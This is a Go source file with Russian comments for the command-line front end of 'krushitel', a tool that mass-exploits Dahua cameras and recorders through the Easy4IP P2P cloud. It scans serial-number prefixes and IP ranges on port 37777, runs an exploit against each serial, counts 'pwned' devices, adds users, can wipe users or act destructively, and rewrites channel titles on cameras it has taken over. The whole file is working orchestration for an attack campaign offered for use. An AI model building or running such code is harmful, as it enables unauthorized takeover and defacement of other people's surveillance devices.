package main

// headless — CLI-режим без TUI:
//
//	krushitel -i serials.txt -m exploit -o papkabebra1337 -t 30
//	krushitel -i results.txt -m titles
//
// stdout — минималистичный формат (баннер, started, saving, прогресс,
// [!] err для ошибок СОФТА, finished). Весь сетевой шум и per-serial
// события — только в log.txt рядом с результатами. config.json тот же,
// результаты те же (results/done/nostun, session-маркер для resume).
// Ctrl+C = esc в TUI: session-маркер остаётся, следующий запуск продолжит.

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"krushitel/cloud"
	"krushitel/dhip"
	"krushitel/exploit"
	"krushitel/fwd"
	"krushitel/ironscan"
	"krushitel/rtsp"
	"krushitel/scanner"
	"krushitel/ui"
	"krushitel/update"
)

var (
	logMu   sync.Mutex
	logFile *os.File
	start   time.Time
)

// flog — файловый лог (сетевой шум, per-serial события). stdout не трогает.
func flog(format string, args ...any) {
	logMu.Lock()
	defer logMu.Unlock()
	if logFile != nil {
		fmt.Fprintf(logFile, "[%s] ", time.Now().Format("15:04:05"))
		fmt.Fprintf(logFile, format+"\n", args...)
	}
}

// out — строка в stdout И в файл (баннер, started, err — то, что юзер читает).
func out(format string, args ...any) {
	logMu.Lock()
	defer logMu.Unlock()
	fmt.Printf(format+"\n", args...)
	if logFile != nil {
		fmt.Fprintf(logFile, format+"\n", args...)
	}
}

// isTTY — рисовать прогресс поверх строки (\r) или печатать периодически.
func isTTY() bool {
	fi, err := os.Stdout.Stat()
	return err == nil && fi.Mode()&os.ModeCharDevice != 0
}

// elapsed — сколько идёт прогон: MM:SS, после часа — H:MM:SS (это не ETA,
// никакой предсказательной хуйни — просто время в работе).
func elapsed() string {
	d := time.Since(start).Truncate(time.Second)
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	if h > 0 {
		return fmt.Sprintf("%d:%02d:%02d", h, m, s)
	}
	return fmt.Sprintf("%02d:%02d", m, s)
}

// cloudAlive — проб главного сервера облака Dahua: TCP-коннект за 5 сек.
// Без сети скан/эксплойт невозможны (всё через P2P-облако) — фейлим сразу
// и честно, вместо миллиона таймаутов.
func cloudAlive() bool {
	// облако Dahua говорит по UDP — TCP-проба туда лжёт, поэтому «пинг» =
	// резолв главного сервера (DNS мёртв = сети нет; резолвится = работаем)
	r := &net.Resolver{}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addrs, err := r.LookupHost(ctx, fwd.MAIN_SERVER)
	return err == nil && len(addrs) > 0
}

func headlessUsage() {
	fmt.Print(`krushitel headless:
  -i, --input FILE     входной файл (exploit: серийники; titles: results.txt)
  -m, --mode MODE      exploit (по умолчанию) | titles | scan | ironscan
  -p, --port PORT      порт для ironscan (по умолчанию 37777)
  -o, --output DIR     папка результатов (по умолчанию — имя входного файла)
  -t, --threads N      потоки (по умолчанию 30)
  -f, --fresh          игнорировать session-маркер и done.txt (прогон заново)
Бой — config.json (snaps/xml/preflight/destructive/wipe_users/dummy).
Ctrl+C — мягкая остановка: session-маркер остаётся, следующий запуск продолжит.
`)
}

// runHeadless — true: вызов обработан CLI-режимом; false: обычный TUI-старт.
// Headless — ЛЮБОЙ запуск с флагом (голый `krushitel` = TUI).
func runHeadless() bool {
	help := false
	headless := false
	for _, a := range os.Args[1:] {
		if strings.HasPrefix(a, "-") {
			headless = true
		}
		if a == "-h" || a == "--help" || a == "help" {
			help = true
		}
	}
	if help {
		headlessUsage()
		return true
	}
	if !headless {
		return false
	}

	fs := flag.NewFlagSet("krushitel", flag.ContinueOnError)
	inFile := fs.String("i", "", "входной файл")
	fs.StringVar(inFile, "input", "", "алиас -i")
	mode := fs.String("m", "exploit", "режим: exploit | titles")
	fs.StringVar(mode, "mode", "exploit", "алиас -m")
	outDir := fs.String("o", "", "папка результатов")
	fs.StringVar(outDir, "output", "", "алиас -o")
	threads := fs.Int("t", 30, "потоки")
	fs.IntVar(threads, "threads", 30, "алиас -t")
	fresh := fs.Bool("f", false, "прогон заново, без resume")
	fs.BoolVar(fresh, "fresh", false, "алиас -f")
	port := fs.Int("p", 0, "порт для ipscan (5000) / ironscan (37777)")
	fs.IntVar(port, "port", 0, "алиас -p")
	if err := fs.Parse(os.Args[1:]); err != nil {
		headlessUsage()
		os.Exit(2)
	}
	if *inFile == "" {
		out("[!] err: нужен -i/--input (файл серийников или results.txt для titles)")
		os.Exit(2)
	}
	if *mode != "exploit" && *mode != "titles" && *mode != "scan" && *mode != "ironscan" {
		out("[!] err: неизвестный режим %q — доступен exploit | titles | scan | ironscan", *mode)
		os.Exit(2)
	}

	ui.LoadSettings()
	ui.ApplyLang()
	cfg := ui.Config()
	start = time.Now()

	tty := isTTY()
	var lineLen int

	// render — строка прогресса поверх строки; в пайпе — раз в 30с полной строкой.
	render := func(done, total int64, hits string) {
		line := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
		logMu.Lock()
		defer logMu.Unlock()
		if tty {
			if len(line) < lineLen {
				line += strings.Repeat(" ", lineLen-len(line))
			}
			lineLen = len(line)
			fmt.Printf("\r%s", line)
		} else {
			fmt.Println(line)
			if logFile != nil {
				fmt.Fprintln(logFile, line)
			}
		}
	}
	var lastProgress time.Time
	progress := func(done, total int64, hits string) {
		if !tty && time.Since(lastProgress) < 30*time.Second {
			return
		}
		lastProgress = time.Now()
		render(done, total, hits)
	}
	renderDone := func(done, total int64, hits string) {
		logMu.Lock()
		defer logMu.Unlock()
		final := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
		if tty {
			if len(final) < lineLen {
				final += strings.Repeat(" ", lineLen-len(final))
			}
			fmt.Printf("\r%s\n", final)
			lineLen = 0
		} else {
			fmt.Println(final)
		}
		if logFile != nil {
			fmt.Fprintln(logFile, final)
		}
	}

	// облачные режимы требуют easy4ip; ironscan ходит по прямым IP
	if *mode != "ironscan" && !cloudAlive() {
		out("[!] NetErr: Timeout (easy4ip) | Check your internet connection")
		os.Exit(1)
	}

	switch *mode {
	case "exploit":
		os.Exit(runHeadlessExploit(cfg, *inFile, *outDir, *threads, *fresh, progress, renderDone))
	case "titles":
		os.Exit(runHeadlessTitles(cfg, *inFile, *threads, progress, renderDone))
	case "scan":
		os.Exit(runHeadlessScan(cfg, *inFile, *outDir, *threads, progress, renderDone))
	case "ironscan":
		os.Exit(runHeadlessIronScan(cfg, *inFile, *outDir, *threads, *port, progress, renderDone))
	}
	return true
}

// runHeadlessIronScan — ironscan: SDK-проба 37777 (DVRIP Realm 0xa001) по
// прямым целям, серийник/модель/прошивка из ответа. Формат целей: список
// IP/хостов (UTF-16 с BOM понимается), CIDR/диапазоны расширяются.
func runHeadlessIronScan(cfg ui.Settings, inFile, outFile string, threads, port int,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
	targets, terr := ironscan.LoadTargets(inFile)
	if terr != nil {
		// файла нет — может, одиночная цель прямо в -i
		if t := strings.TrimSpace(inFile); t != "" && !strings.ContainsAny(t, " 	") {
			targets = []string{t}
		} else {
			out("[!] err: входной файл: %v", terr)
			return 2
		}
	}
	// CIDR/диапазоны в списке — разворачиваем
	expandable := false
	for _, t := range targets {
		if strings.ContainsAny(t, "/-") {
			expandable = true
			break
		}
	}
	if expandable {
		var expanded []string
		for _, t := range targets {
			_, ch, rerr := ipRangeStream(t)
			if rerr != nil {
				expanded = append(expanded, t)
				continue
			}
			for ip := range ch {
				expanded = append(expanded, ip)
			}
		}
		targets = expanded
	}
	if len(targets) == 0 {
		out("[!] err: целей нет")
		return 2
	}
	if port == 0 {
		port = 37777
	}
	if outFile == "" {
		outFile = strings.ReplaceAll(filepath.Base(inFile), ".", "_") + "_iron.txt"
	}
	if filepath.Ext(outFile) == "" {
		outFile += ".txt"
	}
	if threads <= 0 {
		threads = 200
	}

	headlessLogOpen(strings.TrimSuffix(outFile, filepath.Ext(outFile)) + ".log")
	rewriteFile := !headlessAskRewrite(outFile, false)
	ironscan.LogHook = func(f string, a ...any) { flog("%s", fmt.Sprintf(f, a...)) }
	defer func() { ironscan.LogHook = nil }()

	headlessBanner(false)
	out("started ironscanning %d targets (port %d)", len(targets), port)
	out("saving results at //%s", outFile)

	var checked, found int64
	var mu sync.Mutex
	flags := os.O_CREATE | os.O_WRONLY | os.O_APPEND
	if !rewriteFile {
		flags = os.O_CREATE | os.O_WRONLY | os.O_TRUNC
	}
	resFile, rerr := os.OpenFile(outFile, flags, 0644)
	if rerr != nil {
		out("[!] err: выходной файл: %v", rerr)
		return 2
	}
	defer resFile.Close()
	save := func(line string) {
		mu.Lock()
		fmt.Fprintln(resFile, line)
		mu.Unlock()
	}

	ctx, stop := headlessSignals()
	defer stop()

	doneEvents := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				progress(atomic.LoadInt64(&checked), int64(len(targets)), fmt.Sprintf("found: %d", atomic.LoadInt64(&found)))
			case <-doneEvents:
				return
			}
		}
	}()

	irErr := ironscan.Run(ctx, ironscan.Options{
		Targets:     targets,
		Port:        port,
		Timeout:     5 * time.Second,
		Concurrency: threads,
	}, func(r ironscan.Result) {
		atomic.AddInt64(&checked, 1)
		if r.Ok() {
			atomic.AddInt64(&found, 1)
			line := fmt.Sprintf("%s | %s | %s | %s", r.Target, r.Serial, r.Model, r.Firmware)
			save(line)
			flog("[+] %s", line)
		} else if r.Err != "" {
			flog("[-] %s: %s", r.Target, r.Err)
		}
	})
	close(doneEvents)
	renderDone(atomic.LoadInt64(&checked), int64(len(targets)), fmt.Sprintf("found: %d", atomic.LoadInt64(&found)))

	if irErr != nil {
		out("[!] err: ironscan: %v", irErr)
		return 1
	}
	out("ironscan finished")
	if ctx.Err() != nil {
		return 130
	}
	return 0
}

// ipRangeStream — распарсить вход ipscan и стримить IP в канал.
// Форматы: файл со строками-диапазонами (или одна строка в -i):
//
//	192.168.1.0/24             CIDR
//	192.168.1.5-192.168.1.40   диапазон целиком
//	192.168.1.5-40             диапазон последнего октета
//	192.168.1.5                одиночный адрес
func ipRangeStream(inFile string) (int64, <-chan string, error) {
	var lines []string
	if _, err := os.Stat(inFile); err == nil {
		data, rerr := os.ReadFile(inFile)
		if rerr != nil {
			return 0, nil, rerr
		}
		for _, l := range strings.Split(string(data), "\n") {
			if l = strings.TrimSpace(l); l != "" && !strings.HasPrefix(l, "#") {
				lines = append(lines, l)
			}
		}
	} else if t := strings.TrimSpace(inFile); t != "" {
		lines = []string{t}
	}
	if len(lines) == 0 {
		return 0, nil, fmt.Errorf("диапазонов нет (CIDR / a.b.c.d-e / a.b.c.d-x / одиночный IP)")
	}

	type seg struct {
		start, end uint32
	}
	var segs []seg
	var total int64
	const capMax = int64(16 << 20)
	for _, l := range lines {
		switch {
		case strings.Contains(l, "/"):
			_, ipnet, err := net.ParseCIDR(l)
			if err != nil {
				return 0, nil, fmt.Errorf("CIDR %q: %w", l, err)
			}
			ones, _ := ipnet.Mask.Size()
			s := binary.BigEndian.Uint32(ipnet.IP.To4())
			var e uint32
			if ones <= 0 {
				s, e = 0, 0xffffffff
			} else if ones >= 32 {
				e = s
			} else {
				e = s | ((1 << (32 - ones)) - 1)
			}
			segs = append(segs, seg{s, e})
			total += int64(e - s + 1)
		case strings.Contains(l, "-") && strings.Count(l, ".") >= 6:
			parts := strings.SplitN(l, "-", 2)
			a := net.ParseIP(strings.TrimSpace(parts[0])).To4()
			b := net.ParseIP(strings.TrimSpace(parts[1])).To4()
			if a == nil || b == nil {
				return 0, nil, fmt.Errorf("диапазон %q: плохой IP", l)
			}
			s := binary.BigEndian.Uint32(a)
			e := binary.BigEndian.Uint32(b)
			if e < s {
				return 0, nil, fmt.Errorf("диапазон %q: конец раньше начала", l)
			}
			segs = append(segs, seg{s, e})
			total += int64(e - s + 1)
		case strings.Contains(l, "-"):
			parts := strings.SplitN(l, "-", 2)
			base := net.ParseIP(strings.TrimSpace(parts[0])).To4()
			if base == nil {
				return 0, nil, fmt.Errorf("диапазон %q: плохой IP", l)
			}
			x, err := strconv.Atoi(strings.TrimSpace(parts[1]))
			if err != nil {
				return 0, nil, fmt.Errorf("диапазон %q: %w", l, err)
			}
			s := binary.BigEndian.Uint32(base)
			e := (s & 0xffffff00) | uint32(x)
			if e < s {
				return 0, nil, fmt.Errorf("диапазон %q: конец раньше начала", l)
			}
			segs = append(segs, seg{s, e})
			total += int64(e - s + 1)
		default:
			ip := net.ParseIP(l).To4()
			if ip == nil {
				return 0, nil, fmt.Errorf("плохой адрес %q", l)
			}
			segs = append(segs, seg{binary.BigEndian.Uint32(ip), binary.BigEndian.Uint32(ip)})
			total++
		}
	}
	if total > capMax {
		return 0, nil, fmt.Errorf("диапазон слишком велик (%d адресов) — режь на части", total)
	}

	ch := make(chan string, 4096)
	go func() {
		defer close(ch)
		for _, g := range segs {
			for v := g.start; ; v++ {
				ip := make(net.IP, 4)
				binary.BigEndian.PutUint32(ip, v)
				ch <- ip.String()
				if v == g.end {
					break
				}
			}
		}
	}()
	return total, ch, nil
}

// headlessBanner — баннер + автоапдейт: есть релиз свежее — вопрос y/n,
// согласие = Install + перезапуск с теми же флагами (restart делает exec).
func headlessBanner(online bool) {
	now := time.Now().Format("15:04")
	if !online {
		out("[%s] krushitel v%s-beta", now, update.CurrentVersion)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
	defer cancel()
	rel, err := update.Check(ctx)
	if err != nil || rel == nil {
		out("[%s] krushitel v%s-beta (latest)", now, update.CurrentVersion)
		return
	}
	out("[%s] krushitel v%s-beta", now, update.CurrentVersion)
	out("new update! (v%s)", rel.Version)
	out("do you want to update? (y/n)")
	var ans string
	_, _ = fmt.Scanln(&ans)
	ans = strings.ToLower(strings.TrimSpace(ans))
	if ans != "y" && ans != "yes" {
		return
	}
	out("updating to v%s...", rel.Version)
	update.Install(context.Background(), rel)
	if err := update.Restart(os.Stdout, os.Stderr); err != nil {
		out("[!] err: перезапуск не вышел: %v", err)
		os.Exit(1)
	}
	os.Exit(0)
}

// headlessSignals — двойной Ctrl+C: первое нажатие мягко гасит ctx
// (движок доезжает текущий серийник, session-маркер остаётся), второе —
// force-выход. Висящие блокировки больше не игнорируют пользователя.
func headlessSignals() (context.Context, func()) {
	ctx, cancel := context.WithCancel(context.Background())
	sigCh := make(chan os.Signal, 4)
	signal.Notify(sigCh, os.Interrupt)
	go func() {
		n := 0
		for range sigCh {
			n++
			if n == 1 {
				out("[!] detected CTRL + C! exiting... - 1x")
				cancel()
			} else {
				out("[!] Force shutdown - 2x")
				os.Exit(130)
			}
		}
	}()
	return ctx, func() { signal.Stop(sigCh); cancel() }
}

// headlessAskRewrite — «rewrite or modify?» для существующего выхода.
// true = rewrite (с нуля), false = modify (дописать/продолжить, дефолт).
// Пустой ответ в пайпе = modify: данные не теряем.
func headlessAskRewrite(path string, isDir bool) bool {
	st, err := os.Stat(path)
	if err != nil || st.IsDir() != isDir {
		return true // нет — спрашивать не о чем
	}
	label := "file"
	if isDir {
		label = "folder"
	}
	out("[!] %s %s already exists! rewrite or modify %s? (r/m)", label, path, label)
	var ans string
	_, _ = fmt.Scanln(&ans)
	ans = strings.ToLower(strings.TrimSpace(ans))
	return ans == "r" || ans == "rewrite"
}

func headlessLogOpen(path string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		out("[!] err: лог-файл не открылся: %v", err)
		return
	}
	logFile = f
}

// wireHooks — всё сетевое взаимодействие в файл (stdout не засоряем).
func wireHooks(cfg ui.Settings) func() {
	fwd.Debug = cfg.Debug
	fwd.LogHook = func(line string) { flog("%s", line) }
	cloud.LogHook = func(line string) { flog("%s", line) }
	dhip.LogHook = func(format string, args ...any) {
		flog("%s", fmt.Sprintf(format, args...))
	}
	exploit.LogHook = func(format string, args ...any) {
		flog("%s", fmt.Sprintf(format, args...))
	}
	return func() {
		fwd.LogHook = nil
		cloud.LogHook = nil
		dhip.LogHook = nil
		exploit.LogHook = nil
	}
}

// resumeFilter — повтор логики TUI: живой session-маркер + done.txt =
// продолжаем с необработанных. Возвращает (serials, resume).
func resumeFilter(serials []string, outDir string, fresh bool) ([]string, bool) {
	if fresh {
		return serials, false
	}
	data, err := os.ReadFile(filepath.Join(outDir, exploit.SessionFile))
	if err != nil {
		return serials, false
	}
	var sess struct {
		InFile string `json:"in_file"`
	}
	if json.Unmarshal(data, &sess) != nil || sess.InFile == "" {
		return serials, false
	}
	done := make(map[string]struct{})
	if d, err := os.ReadFile(filepath.Join(outDir, exploit.DoneFile)); err == nil {
		for _, line := range strings.Split(string(d), "\n") {
			if s := ironscan.SanitizeSerial(line); s != "" {
				done[s] = struct{}{}
			}
		}
	}
	if len(done) == 0 {
		return serials, false
	}
	remaining := make([]string, 0, len(serials))
	for _, s := range serials {
		if _, ok := done[s]; !ok {
			remaining = append(remaining, s)
		}
	}
	flog("resume: прошлый прогон %q, отработано %d — продолжаем с %d", sess.InFile, len(done), len(remaining))
	return remaining, true
}

func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fresh bool,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
	serials, err := exploit.LoadSerials(inFile)
	if err != nil {
		out("[!] err: входной файл: %v", err)
		return 2
	}
	if len(serials) == 0 {
		out("[!] err: файл пуст или серийников не нашлось")
		return 2
	}
	if outDir == "" {
		outDir = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile))
	}
	if threads <= 0 {
		threads = 30
	}

	_ = os.MkdirAll(outDir, 0755)
	headlessLogOpen(filepath.Join(outDir, "log.txt"))
	rtsp.StdoutSink = logFile
	unhook := wireHooks(cfg)
	defer unhook()

	headlessBanner(true)
	out("started exploiting %d SNs", len(serials))
	out("saving results at //%s", outDir)

	rewrite := headlessAskRewrite(outDir, true)
	if rewrite {
		for _, f := range []string{exploit.ResultsFile, exploit.DoneFile, exploit.NoStunFile, exploit.SessionFile} {
			_ = os.Remove(filepath.Join(outDir, f))
		}
		fresh = true
	}

	// серийники, уже стоящие у нас в results.txt, повторно не крутим —
	// реэксплойт только пересаживает лишних юзеров и плодит дубли
	pwnedBefore := map[string]struct{}{}
	if data, rerr := os.ReadFile(filepath.Join(outDir, exploit.ResultsFile)); rerr == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if i := strings.IndexByte(line, ','); i > 0 {
				if sn := ironscan.SanitizeSerial(line[:i]); sn != "" {
					pwnedBefore[sn] = struct{}{}
				}
			}
		}
	}
	remaining, resume := resumeFilter(serials, outDir, fresh)
	if !fresh && len(pwnedBefore) > 0 {
		kept := remaining[:0]
		for _, sn := range remaining {
			if _, ok := pwnedBefore[sn]; !ok {
				kept = append(kept, sn)
			}
		}
		if d := len(remaining) - len(kept); d > 0 {
			remaining = kept
			fmt.Printf("[%s] already in results: %d serial(s) skipped\n", time.Now().Format("15:04"), d)
		}
	}

	// session-маркер: живёт до чистого завершения (движок удалит)
	sess, _ := json.Marshal(struct {
		InFile  string `json:"in_file"`
		Threads int    `json:"threads"`
		Total   int    `json:"total"`
		Started string `json:"started"`
	}{inFile, threads, len(remaining), time.Now().Format("02.01.2006 15:04:05")})
	_ = os.MkdirAll(outDir, 0755)
	_ = os.WriteFile(filepath.Join(outDir, exploit.SessionFile), sess, 0644)

	// глобальный лимит одновременных P2P-init'ов — паритет с TUI
	fwd.InitLimit = 100

	ctx, stop := headlessSignals()
	defer stop()

	stats := &exploit.Stats{}
	events := make(chan string, 1024)
	doneEvents := make(chan struct{})
	go func() {
		for line := range events {
			flog("%s", line)
		}
	}()
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				progress(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d · added: %d", stats.Pwned, stats.Added))
			case <-doneEvents:
				return
			}
		}
	}()

	exploit.RunExploit(ctx, remaining, outDir, threads, exploit.Opts{
		OutDir:      outDir,
		Snaps:       cfg.Snaps,
		XML:         cfg.XML,
		Titles:      cfg.Titles,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
		DummyLogin:  cfg.DummyLogin,
		DummyPass:   cfg.DummyPass,
		Preflight:   cfg.Preflight,
		Resume:      resume,
		Destructive: cfg.Destructive,
		WipeUsers:   cfg.WipeUsers,
	}, stats, events)

	close(doneEvents)
	close(events)
	renderDone(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d · added: %d", stats.Pwned, stats.Added))

	if stats.ErrorMsg != "" {
		out("[!] err: %s", stats.ErrorMsg)
		return 1
	}
	out("exploit finished")
	if ctx.Err() != nil {
		flog("прервано: session-маркер сохранён, следующий запуск продолжит")
		return 130
	}
	return 0
}

func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
	cams, skipped, err := exploit.ParseResultsCreds(inFile)
	if err != nil {
		out("[!] err: входной файл: %v", err)
		return 2
	}
	if len(cams) == 0 {
		out("[!] err: файл пуст или камер не нашлось")
		return 2
	}

	logName := strings.TrimSuffix(inFile, filepath.Ext(inFile)) + "_titles.log"
	headlessLogOpen(logName)
	unhook := wireHooks(cfg)
	defer unhook()

	headlessBanner(true)
	out("started titling %d cams", len(cams))
	if skipped > 0 {
		out("skipped %d lines", skipped)
	}

	if threads <= 0 {
		threads = 200
	}
	ctx, stop := headlessSignals()
	defer stop()

	stats := &exploit.TitlesStats{}
	events := make(chan string, 1024)
	doneEvents := make(chan struct{})
	go func() {
		for line := range events {
			flog("%s", line)
		}
	}()
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				progress(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))
			case <-doneEvents:
				return
			}
		}
	}()

	exploit.RunTitles(ctx, cams, threads, exploit.Opts{
		Titles:      true,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
	}, stats, events)

	close(doneEvents)
	close(events)
	renderDone(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))

	if stats.ErrorMsg != "" {
		out("[!] err: %s", stats.ErrorMsg)
		return 1
	}
	out("titles finished")
	if ctx.Err() != nil {
		return 130
	}
	return 0
}

// runHeadlessScan — префиксный скан: -i файл с префиксами (>=10 символов,
// берутся первые 10) или одиночный префикс; -o файл живых серийников.
func runHeadlessScan(cfg ui.Settings, inFile, outFile string, threads int,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
	var prefixes []string
	if _, err := os.Stat(inFile); err == nil {
		data, rerr := os.ReadFile(inFile)
		if rerr != nil {
			out("[!] err: входной файл: %v", rerr)
			return 2
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if len(line) >= 10 {
				prefixes = append(prefixes, line[:10])
			}
		}
	} else if t := strings.TrimSpace(inFile); len(t) >= 10 {
		prefixes = []string{t[:10]}
	} else {
		out("[!] err: входной файл с префиксами не найден: %s", inFile)
		return 2
	}
	if len(prefixes) == 0 {
		out("[!] err: префиксов в файле нет (нужно >= 10 символов, берутся первые 10)")
		return 2
	}
	if outFile == "" {
		outFile = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile)) + "_alive.txt"
	}
	if threads <= 0 {
		threads = 30
	}

	appendMode := !headlessAskRewrite(outFile, false)
	headlessLogOpen(strings.TrimSuffix(outFile, filepath.Ext(outFile)) + ".log")
	scanner.Debug = cfg.Debug
	scanner.LogHook = func(line string) { flog("%s", line) }
	defer func() { scanner.LogHook = nil }()

	headlessBanner(true)
	totalSNs := int64(len(prefixes)) * 1048576
	out("started scanning %d prefixes | %d SNs", len(prefixes), totalSNs)
	out("saving results at //%s", outFile)

	// недобитый скан? чекпоинт в <outFile>.state — продолжаем
	if info, ok := scanner.CheckPrefixResume(outFile); ok {
		flog("resume скана: %s", info)
	}

	ctx, stop := headlessSignals()
	defer stop()

	stats := &scanner.ScanStats{}
	events := make(chan string, 1024)
	doneEvents := make(chan struct{})
	go func() {
		for line := range events {
			flog("%s", line)
		}
	}()
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				progress(stats.Checked, stats.Total, fmt.Sprintf("found: %d", stats.Alive))
			case <-doneEvents:
				return
			}
		}
	}()

	scanner.RunPrefixes(ctx, prefixes, outFile, appendMode, false, threads, stats, events)

	close(doneEvents)
	close(events)
	renderDone(stats.Checked, stats.Total, fmt.Sprintf("found: %d", stats.Alive))

	if stats.ErrorMsg != "" {
		out("[!] err: %s", stats.ErrorMsg)
		return 1
	}
	out("scan finished")
	if ctx.Err() != nil {
		return 130
	}
	return 0
}
